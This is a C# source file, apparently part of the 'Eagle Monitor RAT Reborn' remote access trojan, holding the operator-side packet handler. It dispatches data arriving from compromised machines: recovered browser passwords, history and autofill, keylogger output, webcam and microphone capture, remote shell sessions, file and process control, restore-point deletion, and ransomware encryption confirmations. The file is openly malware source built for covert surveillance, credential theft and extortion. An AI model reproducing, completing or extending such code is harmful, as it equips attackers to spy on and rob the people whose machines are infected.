using Eagle_Monitor_RAT_Reborn.PacketHandler;
using PacketLib;
using PacketLib.Packet;
using System;
using System.Drawing;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.Network
{
    internal class PacketHandler
    {
        static PacketHandler()
        {
            packetParser = new PacketHandle(HandlePacket);
        }

        private delegate IPacket PacketHandle(IPacket packet, ClientHandler clientHandler);

        private static readonly PacketHandle packetParser;

        internal static void StartHandlePacket(IPacket packet, ClientHandler clientHandler)
        {
            packetParser.BeginInvoke(packet, clientHandler, new AsyncCallback(EndHandlePacket), clientHandler);
        }

        private static void EndHandlePacket(IAsyncResult ar)
        {
            IPacket packet = packetParser.EndInvoke(ar);
            ClientHandler clientHandler = (ClientHandler)ar.AsyncState;
            IAsyncResult result;
            string size = Misc.Utils.Numeric2Bytes(packet.PacketSize);

            if (ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm != null && ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.bytesReceivedLabel != null)
            {
                result = ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.bytesReceivedLabel.BeginInvoke((Action)(() =>
                {
                    ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.bytesReceivedLabel.Text = $"Bytes received : {size}";
                }));
                ClientHandler.ClientHandlersList[packet.BaseIp].ClientForm.bytesReceivedLabel.EndInvoke(result);
            }

            switch (packet.PacketType)
            {
                case PacketType.CONNECTED:
                    ClientHandler.StartSendData(clientHandler, new BaseIpPacket(packet.BaseIp));
                    //ClientHandler.ClientHandlersList[packet.baseIp].SendPacket(new BaseIpPacket(packet.baseIp));
                    break;

                case PacketType.RC_CAPTURE_ON:
                    return;

                case PacketType.RM_VIEW_ON:
                    return;

                case PacketType.AUDIO_RECORD_ON:
                    return;

                case PacketType.SHELL_COMMAND:
                    return;

                default:
                    result = Program.mainForm.logsDataGridView.BeginInvoke((MethodInvoker)(() =>
                    {
                        int rowId = Program.mainForm.logsDataGridView.Rows.Add();
                        DataGridViewRow row = Program.mainForm.logsDataGridView.Rows[rowId];
                        row.Cells["Column11"].Value = packet.HWID;
                        row.Cells["Column12"].Value = packet.BaseIp;
                        row.Cells["Column13"].Value = packet.PacketType.ToString();
                        row.Cells["Column14"].Style.ForeColor = Color.FromArgb(197, 66, 245);
                        row.Cells["Column14"].Value = packet.PacketState;
                        row.Cells["Column15"].Value = packet.DatePacketStatus;
                        row.Cells["Column17"].Value = size;

                        switch (packet.PacketType)
                        {
                            case PacketType.FM_DOWNLOAD_FILE:
                                row.Cells["Column16"].Value = ((DownloadFilePacket)packet).fileName;
                                break;

                            case PacketType.FM_DELETE_FILE:
                                /*  if (((DeleteFilePacket)packet).deleted == true)
                                      row.Cells["Column16"].Value = Miscellaneous.SplitPath(((DeleteFilePacket)packet).path) + " DELETED";
                                  else
                                      row.Cells["Column16"].Value = Miscellaneous.SplitPath(((DeleteFilePacket)packet).path) + " NOT DELETED";*/
                                break;

                            case PacketType.FM_START_FILE:
                                row.Cells["Column16"].Value = ((StartFilePacket)packet).filePath;
                                break;

                            case PacketType.FM_GET_FILES_AND_DIRS:
                                row.Cells["Column16"].Value = ((FileManagerPacket)packet).path;
                                break;

                            case PacketType.CONNECTED:
                                row.Cells["Column16"].Value = ClientHandler.ClientHandlersList[packet.BaseIp].ClientStatus;
                                break;

                            case PacketType.FM_SHORTCUT_PATH:
                                row.Cells["Column16"].Value = ((ShortCutFileManagersPacket)packet).shortCuts;
                                break;

                            case PacketType.FM_UPLOAD_FILE:
                                /* if (((UploadFilePacket)packet).uploaded == true)
                                     row.Cells["Column16"].Value = Miscellaneous.SplitPath(((UploadFilePacket)packet).path) + " UPLOADED";
                                 else
                                     row.Cells["Column16"].Value = Miscellaneous.SplitPath(((UploadFilePacket)packet).path) + " NOT UPLOADED";*/
                                break;

                            case PacketType.CHAT_ON:
                                row.Cells["Column16"].Value = ((RemoteChatPacket)packet).msg;
                                break;

                            case PacketType.UAC_DELETE_RESTORE_POINT:
                                if (((DeleteRestorePointPacket)packet).deleted == true)
                                    row.Cells["Column16"].Value = ((DeleteRestorePointPacket)packet).index.ToString() + " DELETED";
                                else
                                    row.Cells["Column16"].Value = ((DeleteRestorePointPacket)packet).index.ToString() + " NOT DELETED";
                                break;
                        }
                        Program.mainForm.logsDataGridView.ClearSelection();
                        Program.mainForm.logsDataGridView.CurrentCell = null;
                    }));

                    Program.mainForm.logsDataGridView.EndInvoke(result);
                    break;
            }

            packet = null;
        }

        private static IPacket HandlePacket(IPacket packet, ClientHandler clientHandler)
        {
            switch (packet.PacketType)
            {
                case PacketType.CONNECTED:
                    new ConnectedPacketHandler((ConnectedPacket)packet, clientHandler);
                    break;

                case PacketType.RECOVERY_PASSWORDS:
                    PasswordsPacket pass = (PasswordsPacket)packet;
                    new PasswordsPacketHandler(pass);
                    break;

                case PacketType.RECOVERY_HISTORY:
                    HistoryPacket history = (HistoryPacket)packet;
                    new HistoryPacketHandler(history);
                    break;

                case PacketType.RECOVERY_AUTOFILL:
                    AutofillPacket autofillPacket = (AutofillPacket)packet;
                    new AutofillPacketHandler(autofillPacket);
                    break;

                case PacketType.RECOVERY_KEYWORDS:
                    KeywordsPacket keywordsPacket = (KeywordsPacket)packet;
                    new KeywordsPacketHandler(keywordsPacket);
                    break;

                case PacketType.FM_GET_DISK:
                    DiskPacket disk = (DiskPacket)packet;
                    new DisksPacketHandler(disk);
                    break;

                case PacketType.FM_GET_FILES_AND_DIRS:
                    FileManagerPacket fileManagerPacket = (FileManagerPacket)packet;
                    new FileManagerPacketHandler(fileManagerPacket);
                    break;

                case PacketType.FM_SHORTCUT_PATH:
                    ShortCutFileManagersPacket shortCutFileManagersPacket = (ShortCutFileManagersPacket)packet;
                    new ShortCutFileManagersPacketHandler(shortCutFileManagersPacket);
                    break;

                case PacketType.FM_DOWNLOAD_FILE:
                    DownloadFilePacket downloadFilePacket = (DownloadFilePacket)packet;
                    new DownloadFilePacketHandler(downloadFilePacket, clientHandler);
                    break;

                case PacketType.FM_DELETE_FILE:
                    DeleteFilePacket deleteFilePacket = (DeleteFilePacket)packet;
                    new DeleteFilePacketHandler(deleteFilePacket);
                    break;

                case PacketType.PM_GET_PROCESSES:
                    ProcessManagerPacket processManagerPacket = (ProcessManagerPacket)packet;
                    new ProcessManagerPacketHandler(processManagerPacket);
                    break;

                case PacketType.PM_KILL_PROCESS:
                    ProcessKillerPacket processKillerPacket = (ProcessKillerPacket)packet;
                    new ProcessKillerPacketHandler(processKillerPacket);
                    break;

                case PacketType.PM_SUSPEND_PROCESS:
                    SuspendProcessPacket suspendProcessPacket = (SuspendProcessPacket)packet;
                    new SuspendProcessPacketHandler(suspendProcessPacket);
                    break;

                case PacketType.PM_RESUME_PROCESS:
                    ResumeProcessPacket resumeProcessPacket = (ResumeProcessPacket)packet;
                    new ResumeProcessPacketHandler(resumeProcessPacket);
                    break;

                case PacketType.RM_VIEW_ON:
                    RemoteViewerPacket remoteViewerPacket = (RemoteViewerPacket)packet;
                    new RemoteViewerPacketHandler(remoteViewerPacket);
                    break;

                case PacketType.RC_GET_CAM:
                    RemoteCameraPacket remoteCameraPacket = (RemoteCameraPacket)packet;
                    new RemoteCameraPacketHandler(remoteCameraPacket);
                    break;

                case PacketType.RC_CAPTURE_ON:
                    RemoteCameraCapturePacket RemoteCameraCapturePacket = (RemoteCameraCapturePacket)packet;
                    new RemoteCameraCapturePacketHandler(RemoteCameraCapturePacket);
                    break;

                case PacketType.AUDIO_GET_DEVICES:
                    RemoteAudioPacket remoteAudioPacket = (RemoteAudioPacket)packet;
                    new RemoteAudioPacketHandler(remoteAudioPacket);
                    break;

                case PacketType.AUDIO_RECORD_ON:
                    RemoteAudioCapturePacket remoteAudioCapturePacket = (RemoteAudioCapturePacket)packet;
                    new RemoteAudioCapturePacketHandler(remoteAudioCapturePacket);
                    break;

                case PacketType.MISC_INFORMATION:
                    InformationPacket informationPacket = (InformationPacket)packet;
                    new InformationPacketHandler(informationPacket);
                    break;

                case PacketType.KEYLOG_ON:
                    KeylogPacket keylogPacket = (KeylogPacket)packet;
                    new KeylogPacketHandler(keylogPacket);
                    break;


                case PacketType.CHAT_ON:
                    RemoteChatPacket chatPacket = (RemoteChatPacket)packet;
                    new ChatPacketHandler(chatPacket);
                    break;

                case PacketType.UAC_GET_RESTORE_POINT:
                    RestorePointPacket restorePointPacket = (RestorePointPacket)packet;
                    new RestorePointPacketHandler(restorePointPacket);
                    break;

                case PacketType.UAC_DELETE_RESTORE_POINT:
                    DeleteRestorePointPacket deleteRestorePointPacket = (DeleteRestorePointPacket)packet;
                    new DeleteRestorePointPacketHandler(deleteRestorePointPacket);
                    break;

                case PacketType.KEYLOG_OFFLINE:
                    KeylogOfflinePacket keylogOfflinePacket = (KeylogOfflinePacket)packet;
                    new KeylogOfflinePacketHandler(keylogOfflinePacket, clientHandler);
                    break;

                case PacketType.RANSOMWARE_ENCRYPTION_CONFIRMATION:
                    RansomwareConfirmationPacket ransomwareConfirmationPacket = (RansomwareConfirmationPacket)packet;
                    new RansomareEncryptionConfirmationPacketHandler(ransomwareConfirmationPacket);
                    break;

                case PacketType.SHELL_COMMAND:
                    StdOutShellSessionPacket stdOutShellSessionPacket = (StdOutShellSessionPacket)packet;
                    new RemoteShellStdOutPacketHandler(stdOutShellSessionPacket);
                    break;

                case PacketType.SHELL_START:
                    StartShellSessionPacket startShellSessionPacket = (StartShellSessionPacket)packet;
                    new RemoteStartShellPacketHandler(startShellSessionPacket);
                    break;

                case PacketType.MISC_NETWORK_INFORMATION:
                    NetworkInformationPacket networkInformationPacket = (NetworkInformationPacket)packet;
                    new NetworkInformationPacketHandler(networkInformationPacket);
                    break;

                default:
                    break;
                    /*   

                      case PacketType.FM_RENAME_FILE:
                          RenameFilePacket renameFilePacket = (RenameFilePacket)packet;
                          new RenameFilePacketHandler(renameFilePacket, clientHandler);
                          break;

                    */
            }
            packet.PacketState = PacketState.RECEIVED;
            packet.DatePacketStatus = DateTime.Now.ToString();
            return packet;
        }
    }
}
